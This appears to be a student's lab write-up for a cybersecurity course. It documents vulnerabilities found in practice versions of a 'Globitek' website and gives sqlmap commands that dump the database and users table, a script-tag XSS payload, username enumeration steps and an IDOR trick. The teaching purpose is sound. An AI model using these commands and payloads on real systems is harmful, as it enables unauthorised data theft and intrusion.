# Cybersecurity_week8

## Six possible vulnerabilities:
- [x] Username Enumeration
- [x] Insecure Direct Object Reference
- [x] SQL Injection
- [x] Cross-Site Scripting
- [ ] Cross-Site Request Forgery
- [ ] Session Hijacking/Fixation
## Vulnerabilities I found and exploited:
- [x] Username Enumeration
- [x] Insecure Direct Object Reference
- [x] SQL Injection
- [x] Cross-Site Scripting
- [x] Bonus Objective 1:
  * Build on the SQL Injection vulnerbility. Experiment to see what other kinds of information one can get the database to reveal.
  
## **Blue** version of Globitek website 
**Vulnerability 1:** SQL Injection
  * **Steps:**
    1. Use command: 'sqlmap -u "https://35.184.168.159/blue/public/salesperson.php?id=1" --current-db' to retrieve the database the website is currently using (which is "globitek_blue")
    2. Use command: 'sqlmap -u "https://35.184.168.159/blue/public/salesperson.php?id=1" -D globitek_blue --tables' to retrieve all of the tables that is in the database
    3. Use command: ''sqlmap -u "https://35.184.168.159/blue/public/salesperson.php?id=1" --dump -D globitek_blue -T users' to retrieve all users' information
  * **GIF walkthrough:**
    * ![sqli](https://user-images.githubusercontent.com/31838335/39098942-fed0c51e-463f-11e8-82c4-e410750e79d1.gif)
    
## **Green** version of Globitek website 
**Vulnerability 1:** Username Enumeration
  * **Steps:**
    1. Type in username
    2. Type in a random password
    3. Teep submitting the wrong password multiple times until the "failed logins" message shows up
  * **GIF walkthrough:**
    * ![usernameenum](https://user-images.githubusercontent.com/31838335/39099064-ef761ec8-4641-11e8-8094-556642464fc3.gif)
    <br></br>
**Vulnerability 2:** Cross-Site Scripting
  * **Steps:**
    1. Go to Contact
    2. Submit a feedback with malicious code: <script>alert('xss')</script>
  * **GIF walkthrough:**
    * ![xss](https://user-images.githubusercontent.com/31838335/39099083-3bf6dbde-4642-11e8-9e3f-1f8d585dd0d9.gif)

## **Red** version of Globitek website 
**Vulnerability 1:** Insecure Direct Object Reference
  * **Steps:**
    1. Go to https://35.184.168.159/blue/public/salesperson.php?id=1
    2. Change the value of id to 10 or 11 would reveal information that should not be revealed
  * **GIF walkthrough:**
    * ![idor](https://user-images.githubusercontent.com/31838335/39099090-56e74dac-4642-11e8-84f7-111537caefb6.gif)

## **Bonus Objective 1:**
  * **Steps:**
    1. Since we know the name of the database we can use sqlmap to retrieve all information in the database
    2. Sample code: 'sqlmap -u "https://35.184.168.159/blue/public/salesperson.php?id=1" -D globitek_blue'
  * **GIF walkthrough:**
    * ![bonus](https://user-images.githubusercontent.com/31838335/39099232-0afc4502-4645-11e8-90de-94fda8d999ae.gif)
